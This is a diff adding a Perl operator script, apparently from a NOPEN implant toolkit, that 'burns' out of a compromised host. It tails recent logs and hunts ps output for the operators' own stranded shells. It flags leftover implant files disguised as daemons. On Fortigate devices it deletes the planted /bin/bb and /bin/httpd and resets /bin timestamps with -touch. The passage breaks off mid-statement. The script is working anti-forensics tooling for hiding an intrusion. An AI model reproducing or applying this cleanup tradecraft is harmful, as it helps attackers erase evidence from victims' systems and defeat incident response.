@@ -1,0 +1,1217 @@
+#!/usr/bin/env perl
+##
+$VER="1.8.3.7" ;
+
+# This can be called either via its gs.auto* script or via a require
+# statement in another auto* script already in play. That script must
+# set @ARGV and already have the $socket open to a NOPEN client's autoport.
+# 
+# NOTE THOUGH:  After one require (say of this script), another one of another
+#               similarly equipped script really confuses things...local data
+#               is not so local.
+
+# nopen seems happier with stderr in lsh runs
+#select STDERR ;
+$| = 1 ;
+$grepregexp = "(sess_[0-9a-f]{32}|s\.[a-z0-9]{6})\$";
+myinit() ;
+$targetdate="";
+my $tmpfile = "$optmp/.lssout.$nopen_rhostname.$$";
+
+unlink($tmpfile);
+local ($sleeppid,$sleepppid,$sleepgrep,
+       $output,$nopenlines,@burnoutput,
+       $cuppid,@cuppids,%cuppids,@cuplines,
+       @psoutput,$psheader,
+       @sleeppids,%sleeppids,@sleeplines,
+       @posixpids,%posixpids,@posixpts,@posixlines,
+       @telnetpids,%telnetpids,@telnetlines,
+       @uudecodepids,%uudecodepids,@uudecodelines,
+       @uncompresspids,%uncompresspids,@uncompresslines,
+       @longlines,
+       @posixptslines,%posixpts,
+       %parentpid, # key==pid value==parentpid
+       %psline, # key==pid value==line
+      ) = ();
+my ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,$localppid,
+    $serverver,$wdir,$targetos,$targetcwd,$targetpid,$targetppid,$targetport,
+    $remotetime,$remoteepochtime);
+my $killsfile = "$opdown/$nopen_rhostname.cup.sleep.kills";
+my $pidsfile = "$opdown/$nopen_rhostname.cup.sleep.pids";
+my $wearcupmode = 1 if -e $killsfile;
+if ($burnmode) {
+  ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,$localppid,
+   $serverver,$wdir,$targetos,$targetcwd,$targetpid,$targetppid,$targetport)
+    = parsestatus();
+  $logdirs .= " $targetcwd" unless ($notmp and $targetcwd =~ m,^/+tmp/*$,);
+  ($output,$nopenlines,@burnoutput) = doit("-lcd /current/down");
+  ($output,$nopenlines,@burnoutput) = doit("-time");
+  ($remotetime) = grep /Remote time according to time/,@burnoutput;
+  ($remotetime) = $remotetime =~ /((Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+(\d+)\s+(\d+):(\d+)(:\d+){0,1}\s*(\d+){0,1})/;
+  chomp($remoteepochtime = `date -d "$remotetime" +\%s`);
+  if ($wearcupmode) {
+    if (open(IN,$pidsfile)) {
+      while (<IN>) {
+	my ($pid1,$pid2) = /(\d+),(\d+)/;
+	push (@sleeppids,$pid1) unless $sleeppids{$pid1}++;
+	push (@cuppids,$pid2) unless $cuppids{$pid2}++;
+      }
+      close(IN);
+    } else {
+      mydie("FATAL ERROR: -gs wearcup was run previously but cannot open $pidsfile");
+    }
+  }
+}
+#($output,$nopenlines,@burnoutput) = doit("-lss -a -f $tmpfile $recursels $logdirs");
+my $extradir = "/" if $dorootdir;
+my @lsopts = ("-aU","-f$tmpfile");
+unless ($nofilter) {
+  open(BURNOUT,">$optmp/burnfilter.$nopen_rhostname");
+  # We use global $grepregexp here, but we need to escape the
+  # the . (dot) so print sends "\." to the burnfilter file.
+  my $escapedexpr = $grepregexp;
+  $escapedexpr =~ s,\.,\\\.,g;
+#  $escapedexpr =~ s,\$,\\$,g;
+  print BURNOUT $escapedexpr."\n";
+#  print BURNOUT "(sess_[0-9a-f]{32}|s\\.[a-z0-9]{6})\$\n";
+  push (@lsopts,"-V","I:$optmp/burnfilter.$nopen_rhostname");
+  close(BURNOUT);
+}
+
+($output,$nopenlines,@burnoutput) =
+  nopenlss(@lsopts,
+	   $recursels,
+	   $logdirs,
+	   $extradir);
+#dbg("lsopts=(@lsopts)
+#burnoutput=(@burnoutput)
+
+#tmpfile=$tmpfile:
+#".`ls -al $tmpfile`."
+
+#recursels=$recursels=
+#logdirs=$logdirs=
+#extradir=$extradir=
+
+#");
+$killpid = filepopup($tmpfile,"-geometry 88x58+1280+0 ".
+		     "-bg white -fg blue ".
+		     "-title \"sorted autologcheck files $nopen_rhostname\"",
+		     "gotoend") unless $nopopup;
+#dbg("lsopts=(@lsopts)
+#burnoutput=(@burnoutput)
+
+#tmpfile=$tmpfile:
+#".`ls -al $tmpfile`."
+
+
+
+#");
+my $matchline = "";
+if ($lines and $promptlater) {
+    ($ans,$matchline) = mygetinput
+      ("You can examine the logs above with -tail now.\n\n".
+       "Paste in the ENTIRE line (triple click it) of the oldest entry you wish to\n".
+       "-tail. $prog will show -tail output for each file at least that current.\n".
+       "(Enter nothing if you want to see no -tail output at all.)\n".
+       "Paste line:");
+    $lines = 0 unless $matchline;
+  }
+unless ($lines == 0) { # do not bother with the rest unless tailing
+  my ($gotone,$file,$type,$gotmatch,$skipping,$moreout,
+      @moreout,%tailthese,@dothese) = (0);
+  while (@burnoutput) {
+    $_ = shift(@burnoutput);
+    chomp;
+    ($type,$file) = /^(.).* \d\d:\d\d \d\d\d\d (\/.*)$/ ;
+    if ($notailfiles{basename($file)}) {
+      $skipping .= sprintf "  %-30s (binary)\n",$file if $gotone;
+      next;
+    }
+    if ($matchline and !$gotmatch) {
+      next unless /^\s*$matchline\s*$/;
+      $gotmatch++;
+    }
+    unless ($type eq "-") {
+      # skip links/dirs/etc
+      $skipping .= sprintf "  %-30s (not a file)\n",$file if $gotone;
+      next;
+    }
+    unless ($matchline) {
+      my ($stampsecs,$monstr,$mday,$hr,$min,$year) = epochseconds($_);
+      next if ($stampsecs < $cutofftime) ;
+#      dbg("($stampsecs,$monstr,$mday,$hr,$min,$year) $_ $stampsecs < $cutofftime $file");
+    }
+    $gotone++;
+    push (@dothese,$file) unless $tailthese{$file}++;
+  }#while (@burnoutput)
+  $gotone=0;
+  my $showme = "@dothese";
+  $showme =~ s/\s/\\t/g;
+  $showme = "Tailing (w/ -tail -$lines) these files:\n\n$showme\n";
+  $showme = "${COLOR_FAILURE}Skipping these:\n$skipping\n$COLOR_NORMAL$showme"
+    if $skipping;
+  my $popupstr = "List of files above also just popped up on right screen.\n"
+    unless $nopopup;
+  while (@dothese) {
+    $file = shift(@dothese);
+    if (!$gotone and $pause and @dothese) {
+#      my ($nextfile) = $dothese[0] =~ /\s\d\d:\d\d\s\d{4}\s(\/.*)/;
+      my $nextfile = $dothese[0] ;
+      my ($ans) = mygetinput("$showme\n$popupstr\n<C>ontinue ($file will be first), or <A>bort","C","A");
+      mydie("User Aborted") if ($ans eq "a");
+    }
+    doit("-tail -$lines $file");
+#    if ($gotone and $pause and @dothese) {
+    if ($pause and @dothese) {
+      my $nextfile = $dothese[0];
+      my ($ans) = mygetinput("Above was tail of: \t$file\n\n".
+			     "<C>ontinue ($nextfile is next), or <A>bort","C","A");
+      if ($ans eq "a") {
+	mydie("User Aborted");
+      }
+    } else {
+      progprint("Above was tail of: \t$file",$COLOR_NORMAL);
+    }
+    $gotone++;
+  }#while (@dothese)
+  unless ($gotone) {
+    progprint("${COLOR_FAILURE}Above${COLOR_NORMAL} is the sorted list of logs in $logdirs, ${COLOR_FAILURE}BUT NONE IS UNDER ${COLOR_FAILURE}$hoursold HOURS OLD${COLOR_NORMAL}\n");
+    #      print OUT "-nohist # ${COLOR_FAILURE}Above${COLOR_NORMAL} is the sorted list of logs in $logdirs, ${COLOR_FAILURE}BUT NONE IS UNDER ${COLOR_FAILURE}$hoursold HOURS OLD${COLOR_NORMAL}\n";
+  }
+}#unless ($lines == 0)
+
+# Must return true value as we are required (e.g., by autosurvey)
+
+return 1 unless $burnmode or !$calledviarequire;
+mydie() unless $burnmode;
+
+# ASSERT: Remainder is burnmode stuff, and cannot be done via require
+
+# Set aside previous copy of this if there as .NNNN
+$burnfile = "$opdown/final-burn.$nopen_rhostname";
+$abortedburnfile = "$opdown/aborted-burn.$nopen_rhostname";
+preservefile($burnfile,$abortedburnfile);
+my ($andps,$whatnext,$arptoo) = (" and -gs pscheck -t","-gs putfiles is next","-gs arp(no need to review arp), ");
+$arptoo = "" if $host_fortigatemode;
+if ( $builtinsonly) {
+  $arptoo = "";
+  $andps = " and -lt";
+  $andps = "-lt" if ($freebsdbox or $host_fortigatemode);
+  $whatnext = "Next/last step is checking/filtering -lt output above and looking for\n".
+    "any files we uploaded, then you must answer \"BURN\".";
+  $wcmd = "-w";
+  $wcmd = "" if $host_fortigatemode;
+}
+offerabort("That was the recent logs by time.\n".
+	   "Proceeding with $arptoo$wcmd$andps");
+
+
+unless ($builtinsonly ) {
+    if ($host_fortigatemode) {
+	preservefile("$opdown/arp_at_burn.$nopen_rhostname");
+	doit("/bin/bb cat /proc/net/arp > T:$opdown/arp_at_burn.$nopen_rhostname");
+    } else {
+	mydo("autoarp","-P");
+    }
+}
+
+
+my %cmds = ();
+%cmds = ( # COMMAND , COMMENT
+	 "0 $wcmd",	$whatnext,) unless !$wcmd;
+
+$pscmd = "/bin/bb ps" if $host_fortigatemode;
+
+if ($host_fortigatemode) {
+    $cmds{"1 $pscmd"} = "Next/last step is checking/filtering $pscmd and -lt output above, and looking for\n".
+	"any files we uploaded, then you must answer \"BURN\".";
+    ($andps,$whatnext,$arptoo) = (" and $pscmd","$pscmd is next","-gs arp(no need to review arp), ");
+} elsif (!$builtinsonly) {
+#  $cmds{"1 $pscmd"} = "Next/last step is checking/filtering $pscmd and -lt output above, and looking for\n".
+#    "any files we uploaded, then you must answer \"BURN\".";
+  mydo("autopscheck","-t","autoburnfile=$burnfile");
+  offerabort("That was your =ps sorted by time.");
+}
+
+my $maxlength = 200;
+foreach my $cmd (sort by_num keys %cmds) {
+  my $comment=$cmds{$cmd};
+  $cmd =~ s/^\d+\s+//;
+  ($output,$nopenlines,@burnoutput) = doit("$cmd >> T:$burnfile");
+  if ($cmd =~ /^={0,1}ps/) {
+    @psoutput = @burnoutput;
+    foreach (@psoutput) {
+      $psheader = $_ if (/PID/ and /USER/ and /COMMAND/);
+      my ($thispid,$ppid) = /^[\s\D]*(\d+)\s+(\d+)/;
+      if ($linuxbox) {
+	($thispid,$ppid) = /^\s*\S+\s+\S+\s+\S+\s+(\d+)\s+(\d+)/;
+      } elsif ($freebsdbox) {
+	($thispid,$ppid) = /^\s*\S+\s+(\d+)\s+(\d+)/;
+      }
+      $psline{$thispid} = $_ if ($thispid);
+      $parentpid{$thispid} = $ppid if ($thispid and $ppid);
+      if ( /bash --posix \+o history/ or
+	  (/bash --po/ and $freebsdbox)
+	 ) {
+	push (@posixlines,$_);
+	if (my ($pts) = /\s(pts\S*)\s/) {
+	  $posixpts{$pts}++;
+	}
+	$posixpids{$thispid}++;
+	$posixpids{$ppid}++ unless (!$ppid or $ppid <= 1);
+      }
+      if (length > $maxlength) {
+	push(@longlines,$_);
+      }
+      if ($wearcupmode) {
+	push (@sleeplines,$_)
+	  if (/sleep\s*\d+\s*$/ and $sleeppids{$thispid});
+	push (@cuplines,$_)
+	  if ($thispid and $cuppids{$thispid});
+      }
+      if (/telnet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}){0,1}/) {
+	push (@telnetlines,$_);
+	$telnetpids{$thispid}++ ;
+#	$telnetpids{$ppid}++ unless (!$ppid or $ppid <= 1);
+      }
+      if (/uudecode/) {
+	push (@uudecodelines,$_);
+	$uudecodepids{$thispid}++ ;
+#	$uudecodepids{$ppid}++ unless (!$ppid or $ppid <= 1);
+      }
+      if (/uncompress/) {
+	push (@uncompresslines,$_);
+	$uncompresspids{$thispid}++ ;
+#	$uncompresspids{$ppid}++ unless (!$ppid or $ppid <= 1);
+      }
+    }
+  }
+  offerabort($comment);
+}
+@posixpids = sort keys %posixpids;
+@telnetpids = sort keys %telnetpids;
+@uudecodepids = sort keys %uudecodepids;
+@uncompresspids = sort keys %uncompresspids;
+
+my $ptsgrepstr = join("|",sort keys %posixpts,@posixpids);
+$ptsgrepstr =~ s,/,.,g;
+@posixptslines = grep / ($ptsgrepstr) /,@burnoutput;
+@posixpts = sort keys %posixpts;
+my $sleepcuplines = join("\n",@sleeplines,@cuplines);
+#dbg("ptsgrepstr=$ptsgrepstr=
+#posixpids=(@posixpids)
+#posixpts=(@posixpts)
+#posixptslines=(@posixptslines)
+#sleeplines=(@sleeplines)\nsleepcuplines=$sleepcuplines");
+my $lsfile="$opdown/final-ls.$nopen_rhostname";
+preservefile($lsfile);
+`lss $tmpfile | tee $lsfile >> $burnfile`;
+
+# Last use of $burnfile, we log that timestamp
+unless (my $myhop = $gbl_nopenhosts{$nopen_rhostname}) {
+    $myhop = 999;
+    $myhop-- while (defined $gbl_nopenconnect{$myhop}) ;
+    $myhop = "$myhop $nopen_rhostname";
+}
+
+#($output,$nopenlines,@burnoutput) = 
+#  doit("-ls $recursels -t @dodirs >L:$lsfile");
+
+#dbg("
+#Using:
+
+#lss $tmpfile | tee $lsfile >> $burnfile
+
+
+#Just created 
+#burnfile=$burnfile
+#lsfile=$lsfile
+
+
+#ls -al $burnfile $lsfile\n".
+#`ls -al $burnfile $lsfile`
+#   );
+open(IN,$lsfile);
+my @lsoutput=<IN>;
+close(IN);
+#`lss $lsfile >> $burnfile`;
+unlink $lsfile;
+
+  @burnoutput = @lsoutput;
+#if ($nofilter) {
+#  @burnoutput = @lsoutput;
+#} else {
+#  @burnoutput = grep ! /(\s|\/)$grepregexp$/i , @lsoutput;
+#}
+@burnoutput = grep ! /^\s*$/ ,@burnoutput;
+my $badfilesnotefile = "$opdown/final-burn-BADFILES.$nopen_rhostname";
+## Get rid of the colors!
+#@lsoutput = grep ! /\033\[\d;\d{2}m/ ,@lsoutput;
+# Take note of any bad files in final -ls
+# This bunch can be file or dir:
+@badfiles = grep m,[ \/]\.(dskman|psi_ptr|drv|scsi|pci|X11R6)$|/\[|\]$, ,@lsoutput;
+
+
+if ($host_fortigatemode) {
+    my ($output) = doit("-ls /bin/sh /bin/bb /bin/httpd");
+    my ($ans) = mygetinput
+	($COLOR_FAILURE."\n".
+	 "We are on a fortigate.\n$COLOR_NORMAL\n".
+	 "We created the /bin/httpd, /bin/bb files and /bin/sh link, they\n".
+	 "should be deleted now.\n\n".
+	 "Delete those files and -touch /bin/init /bin?","Y");
+    if ($ans eq "y") {
+	progprint("You must answer YES to delete these:\n\nYES\n\n");
+	my $shelltoo = "";
+	$shelltoo = " /bin/sh" if ($host_fortigatelinksh);
+	doit("-rm$shelltoo /bin/bb /bin/httpd",
+	     "-touch /bin/init /bin");
+	sleep 4;
+	doit("-ls -t /bin");
+    }
+}
+# See what files we -put during op
+(%putfiles,@targetfiles,@stilltherefiles) = ();
+if (my $putwarning = putfiles(quiet)) {
+  my $default = "CONTINUE";
+  if ($putwarning =~ /LIKELY THESE ARE OUR/) {
+    $default = "ABORT";
+    $putwarning .= "$COLOR_NORMAL\n".
+      "If you continue here, we will switch to$COLOR_FAILURE".
+	" -B/force-burn$COLOR_NORMAL mode\n";
+  }
+  offerabort($putwarning,$default);
+  # If they continued there, we turn on forceburn
+  $forceburn = 1 if $putwarning =~ /LIKELY THESE ARE OUR/;
+}
+
+my @checkbadfiles = ();
+
+push(@badfiles,@stilltherefiles);
+# This bunch must be files:
+my @lsfilesonly = grep /^-/,@lsoutput;
+push(@badfiles, grep /[ \/](\.scsi|\.pci|.c|t|\.t)$/,@lsfilesonly);
+push(@checkbadfiles, grep /[ \/](\.scsi|\.pci|.c|t|\.t)$/,@lsfilesonly);
+push(@badfiles, grep /[ \/](date|devfsadmd|sendmail|nscd|nfsd|nmbd|crond|podd|ppod|lvmkd|pageout)/,@lsfilesonly);
+push(@checkbadfiles, grep /[ \/](date|devfsadmd|sendmail|nscd|nfsd|nmbd|crond|podd|ppod|lvmkd|pageout)/,@lsfilesonly);
+# Take out files in /etc, we do not use that
+@badfiles = grep ! m, /etc/, , @badfiles;
+@checkbadfiles = grep ! m, /etc/, , @badfiles;
+
+# Take out files starting in /var/run and ending in .pid probably legit
+@badfiles = grep ! m,/var/run/.*\.pid$, , @badfiles;
+@checkbadfiles = grep ! m,/var/run/.*\.pid$, , @badfiles;
+
+# Take out sendmail.st in /var/log, we do not use that
+@badfiles = grep ! m, /var/log/sendmail.st, , @badfiles;
+@checkbadfiles = grep ! m, /var/sendmail/sendmail.st, , @badfiles;
+
+foreach my $hdir (keys %host_hiddendirs) {
+  # We ignore badfiles if in hidden directory
+  @badfiles = grep ! m,$hdir,, @badfiles;
+  @checkbadfiles = grep ! m,$hdir,, @checkbadfiles;
+}
+#dbg("badfiles=(@badfiles)");
+@badfiles = uniqify_array(@badfiles);
+@checkbadfiles = uniqify_array(@checkbadfiles);
+my %badfiles=();
+foreach my $fileline (@badfiles) {
+  $badfiles{$fileline}++;
+}
+
+# Highlight any recent files if we have them
+my $yelline = $COLOR_WARNING.("="x79)."\n".$COLOR_NORMAL;
+my @recentfiles = ();
+my ($ratdir,$ratname)=();
+foreach (@lsoutput) {
+    next if (m,^d.* /proc$,); # Don't show /proc dir as current, silly
+
+# Why was this only HPUX? See if this flags too often.
+#  if ($hpuxbox) {
+    if (m,^[^/]+(/\S+),) {
+      my $file = $1;
+      if ($file =~ /(sendmail|nscd|nfsd|nmbd|crond|podd|ppod|lvmkd)/) {
+	$ratname = $file;
+	$ratdir = dirname($file);
+      }
+    }
+#  }
+  next if $badfiles{$_};
+  my ($filetime) = /((Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+(\d+)\s+(\d+):(\d+)(:\d+){0,1}\s*(\d+){0,1})/;
+  next unless $filetime;
+  chomp(my $fileepochtime = `date -d "$filetime" +\%s`);
+  my $diff = abs($fileepochtime - $remoteepochtime);
+  next unless $diff < $hoursold * 60 * 60 ;
+#  dbg("diff=$diff fet=$fileepochtime ret=$remoteepochtime recent: $_");
+  push(@recentfiles,$_);
+}
+if (@recentfiles) {
+  my $recentfiles = 
+    $yelline.    $yelline.
+    join("",@recentfiles).$COLOR_WARNING.
+    $yelline.    $yelline;
+  offerabort("Checking: $logdirs /.\n".
+	     "\n$recentfiles\n".
+	     "List above shows these recent files under ${hoursold}h old.\n\n".
+	     "You$COLOR_FAILURE might$COLOR_NORMAL want to consider aborting and checking those out, though\n".
+	     "of course normal host behavior may be causing them.");
+}
+my $badfilelist = "";
+if (@badfiles) {
+  my $logdirslist="";
+  foreach (split(/\s+/,$logdirs)) {
+    $logdirslist .= "\n#    $_";
+  }
+  preservefile($badfilesnotefile);
+  foreach (@badfiles) {
+    my $file="";
+    if ($hpuxbox and m, \d\d \d\d:\d\d \d\d\d\d (/\S+),) {
+      $file = $1;
+#      next if ($file eq $ratdir or $file eq $ratname);
+    }
+    $badfilelist .= "$_\n";
+  }
+}
+my ($more,$more2,$more3) = ();
+if (@posixlines or @telnetlines or @uudecodelines or @uncompresslines) {
+  if (!$builtinsonly and ($targetdate) = doit("date ; date -u")) {
+    $targetdate =        "Target dates:    DATE    : ".$targetdate;
+    $targetdate =~ s/\n/\n                 DATE GMT: /;
+  }
+}
+if (@posixlines) {
+  my $are = "is a";
+  my $they = "this";
+  my $s = "";
+  if (@posixlines > 1) {
+    $s    = "s";
+    $are  = "are";
+    $they = "they";
+  }
+  $more .= join("\n",$psheader,@posixptslines);
+  my $pidregexp = join("|",@posixpids);
+  my @ptsnotposix = grep !/$pidregexp/,@posixptslines;
+  if (@ptsnotposix) {
+    my $s = "";
+    my $are = "is a";
+    my $DO = "DOES";
+    $more3 = "\n\n".
+      "$COLOR_NOTE  ALSO NOTE: There $are line$s matching the PTSs that $DO NOT match any of the\n".
+      "  posix PIDs:$COLOR_FAILURE\n".
+      join("\n",$psheader,@ptsnotposix);
+  }
+  offerabort
+    ($targetdate.
+     $COLOR_FAILURE."\n".
+     "POTENTIAL problem $pscmd line$s:\n$COLOR_NOTE\n".
+     $more."\n$COLOR_FAILURE\n".
+     "There $are bash.*posix line$s in the $pscmd that could be our stranded initial\n".
+     "ftshell session$s from today's or previous successful triggers (with possibly\n".
+     "UNSUCCESSFUL upload/execute phases). Above you see ALL entries from $pscmd with\n".
+     "any of these associated PIDs and/or pts/# TTYs:\n".
+     "     PIDs=@posixpids     PTSs=@posixpts\n".
+     "CONSIDER:\n\n".
+     "  #   Is the time shown recent? If not, could it still be us?\n".
+     "  #   Get help. No one can make this call alone.\n".
+     "  #   Only continue here if you are SURE these are not us.\n\n".
+     "If you and the experts AGREE $they $are us, abort (the default option here),\n".
+     "kill those pids (see pastable below), and then run -burnBURN again.\n\n".
+     "Kill pastable (if it is ALL us):   #   kill @posixpids".
+     $more3,
+     "A"
+    );
+}
+dbg("HERE0alerton");
+alerton(\@psoutput,
+	\@telnetpids,\@telnetlines,"telnet",
+	\@uudecodepids,\@uudecodelines,"uudecode",
+	\@uncompresspids,\@uncompresslines,"uncompress",
+       );
+if (@longlines) {
+  my $are = "is";
+  my $a = " a";
+  my $are2 = "is";
+  my $they = "this";
+  my $them = "it";
+  my $s = "";
+  my $nots = "s";
+  my $more = join("\n",@longlines);
+  if (@longlines > 1) {
+    $a = "";
+    $s    = "s";
+    $nots    = "";
+    $are  = "are";
+    $are2  = "are";
+    $they = "they";
+    $them = "them";
+  }
+  offerabort
+    (
+     $COLOR_FAILURE."\n".
+     "POTENTIAL problem $pscmd line$s:\n$COLOR_NOTE\n".
+     $more."\n$COLOR_FAILURE\n".
+     "There $are$a long line$s (> $maxlength characters) in the $pscmd output that\n".
+     "need$nots to be looked at.\n".
+     "\n".
+     "CONSIDER:\n\n".
+     "  #   Is the time shown recent? If not, could it still be us?\n".
+     "  #   Does the time/date shown coincide with a recent op?\n".
+     "  #   Get help if you need it (most will).\n".
+     "  #   Only continue here if you are SURE $they $are not us.\n\n".
+     "If you and the experts AGREE $they $are us, abort (the default option here),\n".
+     "and clean $them up.",
+     "A"
+    );
+}
+if ($wearcupmode) {
+  if (@sleeplines > 1) {
+    offerabort
+      ($COLOR_FAILURE.
+       "NOTE: You seem to have run MORE THAN ONE instance of cup. DON'T DO THAT. \n\n".
+       $sleepcuplines."\n\n".
+       "Get help if you need it.\n\n".
+       "You should probably kill both pids for all but one of them, then just the\n".
+       "sleep pid for the remaining instance (your kill pastables will popup after\n".
+       "you hit continue). But if one instance was different than the other, there\n".
+       "might be a reason for two of them. Just be careful.".
+       $COLOR_NOTE);
+  }
+#  dbg("wearcupmode=$wearcupmode hpux=$hpuxbox linux=$linuxbox \n".
+#      "sleeplines=(@sleeplines) cuplines=(@cuplines)");
+  unless (@sleeplines) {
+    $more .=
+      "$COLOR_WARNING    WARNING  WARNING  WARNING        WARNING  WARNING  WARNING\n".
+       "$COLOR_FAILURE    WARNING  WARNING  WARNING        WARNING  WARNING  WARNING\n".
+       "$COLOR_WARNING    WARNING  WARNING  WARNING        WARNING  WARNING  WARNING\n\n".
+       $COLOR_NOTE ;
+    if (-e $killsfile) {
+      $more .= "NOTE: There is a $killsfile\n".
+	"      file, indicating that -gs wearcup had been run once, but those pids\n".
+        "      are now gone.\n\n";
+      $more2 = " again";
+    }
+    if ($hpuxbox) {
+      mydie
+	(".\n\n\n\n".$COLOR_NOTE.
+	 $more.
+	 "You are on an HP-UX box ($COLOR_FAILURE$nopen_serverinfo$COLOR_NOTE),\n".
+	 $COLOR_FAILURE.
+	 "BUT THERE IS NO CUP SCRIPT RUNNING!  You must do that at the beginning\n".
+	 "of your op!!  Run -gs wearcup$more2 now (add any other options you may need):$COLOR_NORMAL\n\n\t-gs wearcup"
+	);
+    } else {
+      mydie(".\n\n\n\n".$COLOR_NOTE.
+	    $more.
+	    "You previously ran \"-gs wearcup\",$COLOR_FAILURE\n".
+	    "BUT THERE IS NO LONGER ANY CUP SCRIPT RUNNING!\n".
+	    "You are not on an HP-UX box, so perhaps you meant to kill the cup script?\n".
+	    "If that is the case, use \"-burnBURN -B\" to override this objection and\n".
+	    "proceed with the -burn."
+	   ) unless $forceburn;
+    }
+  }
+}
+#dbg("badfilelist=$badfilelist=
+#badfilesnotefile=$badfilesnotefile=\n\n".`cat $badfilesnotefile`);
+
+# Offer to examine any @badfiles on target with -gs toolcheck.
+#dbg("checkbadfiles has ".scalar @checkbadfiles." entries before
+#(@checkbadfiles)
+#  ");
+
+@checkbadfiles = uniqify_array(@checkbadfiles);
+
+#dbg("checkbadfiles has ".scalar @checkbadfiles." entries after
+#  (@checkbadfiles)
+#  ");
+
+# 20100621: Disabled this checkbadfiles section for now.
+if (@checkbadfiles) {
+  offerabort("${COLOR_FAILURE}\n   ".
+	     join("\n   ",@checkbadfiles).
+	     "${COLOR_NORMAL}\n".
+             "List above shows these files on target, possibly left by us.\n\n".
+	     "If you $COLOR_FAILURE continue$COLOR_NORMAL, $prog will offer to check each binary using\n".
+	     "-gs toolcheck now, or abort and check them yourself.");
+  # Grab the filenames and push each one through.
+  my @autoargv = ();
+  my ($filepath,$dir,$file) = ();
+  my %donealready = ();
+  foreach(@checkbadfiles) {
+    $filepath = $1 if /^-.*\s(\/.*\/\S+)$/;
+    next unless $filepath;
+    next if $donealready{$filepath}++;
+    ($dir,$file) = ($1,$2) if $filepath =~ /(\/.*)\/(\S+)$/;
+    my ($ans) = mygetinput("Proceed with check of $filepath using -gs toolcheck -d$dir -f$file?","N");
+    if ($ans eq "n") {
+      $badfilelist =~ s,\n[^\n]* $filepath\n,\n,g;
+      $badfilelist =~ s,^[^\n]* $filepath\n,,g;
+      next ;
+    }
+    @autoargv = ("-d$dir","-f$file");
+    mydo("autotoolcheck",@autoargv);
+    #dbg("    mydo(autotoolcheck,@autoargv); returned $?");
+    @autoargv = ();
+    ($filepath,$dir,$file) = ();
+  }
+}
+  
+$badfilelist = "" if ($badfilelist eq "\n");
+if ($badfilelist) {
+  open(OUT,">$badfilesnotefile");
+  my ($hpuxstuff,$hpuxmore,$hpuxgeom) = ();
+  my $cleanmore = "Clean that up!";
+  if ($hpuxbox) {
+    $cleanmore = "";
+    $hpuxstuff = " (but this is an HP-UX box with wearcup running, so that is ok.)\n".
+      "#\n#\n".
+      "# If these are ALL either\n#\n".
+      "#      1) going to be taken care of by your cup script (that is,\n".
+      "#         wiped by the script uploaded earlier), or\n#\n".
+      "#      2) NOT OURS AT ALL AND YOU ARE SURE OF THAT\n#\n".
+      "# then you can/should continue with the single \"kill\" of your sleep\n".
+      "# PID to complete the op by firing your CleanUP (cup) script. \n#\n";
+    $hpuxmore = " MAY OR MAY NOT";
+    $hpuxgeom = "+855+0 ";
+  }
+  print OUT "# during -gs burnBURN on $nopen_rhostname. $cleanmore\n";
+  print OUT "# \n";
+  if ($forceburn) {
+    print OUT "# \n";
+    print OUT "# \n";
+    print OUT "# YOU ARE PROCEEDING WITH THE BURN APPARENTLY. \n";
+    print OUT "#\n#\n#\n";
+  } else {
+    print OUT "# NOTE: Feel free to get help here to figure this out if\n";
+    print OUT "#       you are not sure what is and what is not BAD.\n#\n#\n";
+    print OUT "#\n# UNABLE TO BURN!!!!$hpuxstuff\n#\n";
+    print OUT "# WE$hpuxmore HAVE A PROBLEM!!! THERE ARE BAD FILES\n";
+    print OUT "# somewhere on target (see below).\n";
+    print OUT "# $logdirslist\n#\n";
+  }
+  if (!$hpuxbox) {
+    if ($forceburn) {
+      print OUT "# You ran -burnBURN -B, forcing -burn despite a possible BAD FILE (see below).\n";
+      print OUT "#\n#\n#\n";
+      print OUT "# You must have gotten an expert (or ANOTHER one, at least TWO of you) and you\n";
+      print OUT "# both agreed that proceeding is correct. If that is not the case, abort and do it.\n";
+      print OUT "#\n";
+      print OUT "# You are still shown this popup for emphasis. You may close it and continue\n";
+      print OUT "# if you are cleared to proceed despite this issue.\n";
+    } else {
+      print OUT "# If they are not ours and you AND YOUR BUDDY are sure, rerun $prog\n";
+      print OUT "# with the -B option to force the $prog to not die here\n";
+    }
+  }
+  print OUT "# \n";
+  print OUT "$badfilelist";
+  close(OUT);
+  filepopup($badfilesnotefile,
+	    "-geometry 88x88$hpuxgeom -bg red -fg white");
+  mydie("See popped up window for problem files/directories.\n\t\t\t".
+	"Fix that or get help and try again.")
+    unless $forceburn or $hpuxbox;
+}
+if ($badfilelist eq "" and -e $badfilesnotefile) {
+  rename($badfilesnotefile,"$badfilesnotefile.HPUXBURN")
+    if (-e $badfilesnotefile and $hpuxbox);
+  rename($badfilesnotefile,"$badfilesnotefile.RESOLVED")
+    if -e $badfilesnotefile;
+}
+my $filtermore = "(with$COLOR_NOTE $grepregexp$COLOR_NORMAL filtered out)"
+  unless $nofilter;
+#dbg("output=(@burnoutput)");
+offerabort(".\n\n\n".
+	   "$COLOR_NORMAL\n".
+	   " @burnoutput\n\n".
+	   "That was -ls -t output $filtermore"
+	  )
+  unless $hpuxbox;
+
+# We assume here a pitch will never need -gs wearcup as part of the 
+# -burn/exit process, no need to check for $lastout.
+if ($wearcupmode) {
+  # Child pops up the kill commands to use
+  unless (! -e $killsfile or fork) {
+    close(STDOUT);
+    close(STDIN);
+    close(STDERR);
+    close($socket) if (defined $socket);
+    # Make sure we are on top of badfiles window, sleep 1
+    sleep 1;
+    exec("xterm -ut +cm +cn -sk -sb -sl 15000 -title WEARCUP_KILLS ".
+	 "-hold -geometry 74x52-53+26 -bg white -fg red -e ".
+	 "cat $killsfile");
+    exit;
+  }
+  chomp(my $grepcleaner = `grep grep $killsfile`);
+  my $cupmore = "You are on an HP-UX box ($COLOR_FAILURE$nopen_serverinfo$COLOR_NOTE),\n"
+    if $hpuxbox;
+  $cupmore = "You are NOT (repeat NOT) on an HP-UX box\n".
+    "($COLOR_FAILURE$nopen_serverinfo$COLOR_NOTE),\n"
+    unless $cupmore;
+  $cupmore .= "it appears your wearcup script will be doing some cleaning for you,\n"
+    if $grepcleaner;
+  mydie(".\n\n\n".
+	"$COLOR_NORMAL\n".
+	" @burnoutput\n\n".
+	"That was -ls -t output $filtermore".
